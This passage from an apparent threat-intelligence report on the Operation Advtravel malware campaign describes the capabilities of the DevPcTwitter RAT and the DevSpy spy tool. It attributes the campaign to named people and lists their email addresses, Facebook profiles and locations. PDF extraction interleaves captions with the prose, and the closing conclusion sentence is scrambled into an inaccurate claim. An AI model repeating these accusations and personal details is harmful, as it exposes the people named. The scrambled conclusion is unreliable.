format\nDev_hima’s bot used to communicate with advtravel.info.\n\nDev_hima shared tutorial videos on YouTube on how to configure and use\nDevPcTwitter. These videos were linked to his personal page. His Twitter bot’s\nfunction is simple. It lets a user register a Twitter account and an email address in the\n\n\n-----\n\n_List of website attacks that Dev_hima’s hacker group was involved with_\n\n\nDevPcTwitter program. The user\ncan then start tweeting commands\nvia the account registered, which the\nbot reads and executes. Commands\nsuch as GetScreenShot tells\nDevPcTwitter to take screenshots of\na victim’s desktop that it then emails\nto the email address registered. The\nbot can also download and execute\nfiles using the Download$[URL]\ncommand.\n\n\n_DevPcTwitter’s UI shows it was designed for Arabic-speaking_\n_users._\n\n\nDevPcTwitter is low-risk because it\nrequires a lot of user interaction to set up and operate. Its bot does not have the\nfunctionality to stealthily run in the background as well.\n\nDev_hima also developed the spying tool, DevSpy. Its installer (MD5:\n\n\n-----\n\n_Tools available for public download on Dev_hima’s website_\n\n\n_d325c541fa0f3080a25394fe3a586100910f5569)_\nis also available for public download from http://\n_devhima.webs.com/. Unlike DevPcTwitter, the_\nDevSpy interface uses English, not Arabic. Its\nsetup is also pretty self-explanatory. It takes\ndesktop screenshots at user-specified intervals\nthat it then stores in a folder. It can stealthily run\nin the background. In stealth mode though, it can\nbe only be accessed by pressing a hotkey that\nrequires password authentication. In the same\nmode, DevSpy can remove itself from a victim’s\nWindows Task Manager process list.\n\nDevSpy is medium- to high-risk because it is\ndesigned to spy on users in stealth mode. It is\npossible or even likely that the malware used to\ncommunicate with advtravel.info is a privately\nenhanced version of Dev_hima’s\ntools.\n\n##### VIRUS_HIMA\n\nDev_hima used the handles, hima, virusxhima\nand ViRuS_HiMa, with the email address,\n_virusxhima@gmail.com, though there was not_\nenough evidence to confirm that Dev_hima and\nViRuS_HiMa are the same person.\n\nViRuS_HiMa had ties to several high-profile\nhacking attacks, including:\n\n   - The theft of 150,000 passwords from\nAdobe employees, customers, and\npartners such as the U.S. Military, USAF,\nGoogle, NASA, and DHL [5]\n\n\n_DevPcTwitter supports an extensive array of_\n_executable commands._\n\n\n-----\n\n   - The cross-site scripting\n(XSS) attack on 2shared.\ncom [6]\n\n   - More than 1,700 website\ndefacement incidents\n\n   - The Yahoo SQL attack\nclaimed to have been by\nperpetrators from Egypt\n\n[7]\n\nSome emails with ties to ViRuS_\nHiMa include virusxhima@gmail.\n_com, egypt_government@hotmail._\n_com, a.e@hotmail.com, and ana._\n_msre@hotmail.com._\n\n#### Mohammed Khaled\n\n\n_DevSpy’s UI and setup console_\n\n\nAs previously mentioned, one advtravel.info file—Mkhaled.txt—had the\nlink, https://www.facebook.com/messages/LODALODALODA. When\nclicked, a Facebook message was sent to a Mohamed Khaled profile\npage (https://www.facebook.com/LODALODALODA) as notification of\nnew successful system infections. The profile indicates that Khaled lives\nin Cairo, Egypt.\n\nInterestingly, a Mohamed Khaled can be further connected to Dev_\nhima. On a page promoting Dev_hima’s DevPcTwitter tool, we saw one\ncomment from a Mohamed Khaled regarding the remote access tool\n(RAT).\n\n#### Fathy Mostafa\n\n\n_.TXT file snippet from http://_\nwww/hackerbox.net/upload.\ntxt showing a relationship\n_between Dev_hima and_\n_ViRuS_HiMa_\n\n\nFathy Mostafa is another individual with apparent connections to Operation Advtravel.\nIn one of the advtravel.info logs, we saw a screenshot of the main Advtravel malware\nunder development.\n\nThe code showed testing URLs that used the same paths as the actual malware that\naccessed the advtravel.info domain. The username, fathy, can clearly be seen. Other\nlogs from the same infection gave us some stolen account details, including:\n\n_•_ _http://members.000webhost.com/login.php was registered using_\n_ismaelalaa32@gmail.com and fathymostafa9@gmail.com_\n\n_•_ _https://khamsat.com/register, https://www.freelancer.com/, and https://www._\n_linkedin.com/uas/login used fathymostafa9@gmail.com_\n\nMostafa’s’s skills, according to work profile sites, include C# programming, which was\ncoincidentally used to program the Advtravel malware.\n\n\n-----\n\n_Mohammed Khaled’s Facebook profile and picture_\n\n\nThe email address, fathymostafa9@\n_gmail.com, was also associated with_\nthe Facebook account, https://www.\n_facebook.com/fathy.mostafa.1690._\nThe profile indicates that Mostafa\nlives in Egypt, like many others\ntied to Operation Advtravel. He\nstudied Electronic Engineering and\nis a member of several Facebook\ngroups, including two that were\nrelated to the Muslim Brotherhood.\n\n[8]\n\n#### Other Individuals\n\nIn addition to the previously\nmentioned individuals, other\nnicknames associated with\nOperation Advtravel have been\nfound as well. We saw three other\naccount names—khodla, belal, and\n_belal2—on the Advtravel control_\npanel.\n\n\n_Khaled commenting on Dev_hima’s RAT_\n\n\nThe systems that belal owned had\nparticular ties to Operation Advtravel\ndue to their use of the word “Roo0T” Advtravel.info log showing the malware code while it was being\nor “Ro0t” in usernames. His systems _developed_\nall had the main malware control\npanel, along with games such as “Counter Strike Global Offensive.” He also had\nfolders containing the njrat7 malware—a popular RAT in Arabic countries, as it was\n\n\n-----\n\nlocally developed and supported. Belal’s folders also contained a .TXT file named Israil mails.txt, which had\n2,572 email addresses, possibly for attack purposes.\n\n\n_Mostafa’s Facebook profile_\n\n\n_Belal logged in to the Advtravel control panel_\n\n\n-----\n\n# CONCLUSION\n\nThe malware campaigns—Operation Arid Viper established the Islamic Resistance Movement,\nand Advtravel—discussed in detail in this paper are better known as “Hamas,” an infamous Palestinian\nseparate but closely linked.
